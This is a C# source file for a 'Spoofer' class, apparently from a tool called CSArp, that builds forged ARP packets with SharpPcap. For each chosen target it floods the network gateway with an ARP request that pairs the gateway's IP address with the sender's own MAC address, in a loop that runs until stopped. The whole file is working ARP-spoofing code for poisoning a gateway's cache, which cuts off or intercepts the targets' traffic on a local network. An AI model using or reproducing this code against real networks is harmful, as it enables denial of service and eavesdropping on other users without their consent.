using System.Collections.Generic;
using System.Net;
using SharpPcap;
using PacketDotNet;
using System.Net.NetworkInformation;
using System.Threading;
using SharpPcap.WinPcap;
using CSArp.View;
using CSArp.Model.Utilities;
using CSArp.Model.Extensions;

namespace CSArp.Model
{
    public class Spoofer
    {
        public WinPcapDevice NetworkAdapter { get; set; }

        private Dictionary<IPAddress, PhysicalAddress> engagedclientlist;
        private bool disengageflag = true;

        public void Start(Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, WinPcapDevice networkAdapter)
        {
            engagedclientlist = new Dictionary<IPAddress, PhysicalAddress>();
            if (!networkAdapter.Opened)
            {
                networkAdapter.Open();
            }

            foreach (var target in targetlist)
            {
                var myipaddress = networkAdapter.ReadCurrentIpV4Address();
                var arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, "00-00-00-00-00-00".Parse(), gatewayipaddress, networkAdapter.MacAddress, target.Key);
                var ethernetpacketforgatewayrequest = new EthernetPacket(networkAdapter.MacAddress, gatewaymacaddress, EthernetPacketType.Arp);
                ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;
                ThreadBuffer.Add(new Thread(() =>
                    SendSpoofingPacket(target.Key, target.Value, ethernetpacketforgatewayrequest, networkAdapter)
                  ));
                engagedclientlist.Add(target.Key, target.Value);
            };
        }
        public void StopAll()
        {
            disengageflag = true;
            if (engagedclientlist != null)
            {
                engagedclientlist.Clear();
            }
        }
        private void SendSpoofingPacket(IPAddress ipAddress, PhysicalAddress physicalAddress, EthernetPacket ethernetpacketforgatewayrequest, WinPcapDevice captureDevice)
        {

            disengageflag = false;
            DebugOutput.Print("Spoofing target " + physicalAddress.ToString() + " @ " + ipAddress.ToString());
            try
            {
                while (!disengageflag)
                {
                    captureDevice.SendPacket(ethernetpacketforgatewayrequest);
                }
            }
            catch (PcapException ex)
            {
                DebugOutput.Print("PcapException @ DisconnectReconnect.Disconnect() [" + ex.Message + "]");
            }
            DebugOutput.Print("Spoofing thread @ DisconnectReconnect.Disconnect() for " + physicalAddress.ToString() + " @ " + ipAddress.ToString() + " is terminating.");
        }
    }
}
